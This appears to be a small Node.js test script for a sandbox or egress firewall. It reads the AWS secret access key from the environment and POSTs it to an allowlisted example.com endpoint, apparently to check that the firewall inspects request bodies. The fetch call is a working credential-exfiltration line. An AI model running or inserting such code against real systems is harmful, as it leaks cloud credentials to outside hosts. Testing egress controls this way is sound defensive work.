const s = process.env.AWS_SECRET_ACCESS_KEY;
async function main() {
  try {
    // example.com is allowlisted; the secret rides in the POST body, which the
    // Node guest sends over the host's undici. The firewall tees the body.
    await fetch("http://example.com/collect", { method: "POST", body: "key=" + s });
    console.log("posted");
  } catch (e) {
    console.log("post failed", e.message);
  }
}
main();
